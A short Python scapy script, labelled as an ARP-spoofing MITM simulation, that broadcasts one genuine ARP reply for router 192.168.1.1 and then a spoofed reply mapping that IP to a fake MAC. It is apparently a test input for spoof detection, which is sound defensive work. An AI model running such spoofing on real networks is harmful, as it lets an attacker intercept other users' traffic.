#!/usr/bin/env python3
from scapy.all import ARP, Ether, send
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

print("[*] 🦹 Simulating MITM (ARP Spoofing)...")

try:
    # First send legitimate ARP
    router_ip = "192.168.1.1"
    real_mac = "11:22:33:44:55:66"
    
    arp1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=router_ip, hwsrc=real_mac, pdst="192.168.1.100")
    send(arp1, verbose=0)
    print(f"[+] Legitimate ARP Sent: '{router_ip} is at {real_mac}'")
    
    time.sleep(2)
    
    # Then send spoofed ARP
    fake_mac = "aa:bb:cc:dd:ee:ff"
    arp2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=router_ip, hwsrc=fake_mac, pdst="192.168.1.100")
    send(arp2, verbose=0)
    print(f"[+] Spoofed ARP Sent: '{router_ip} is at {fake_mac}'")
    
except Exception as e:
    print(f"[-] Error: {e}")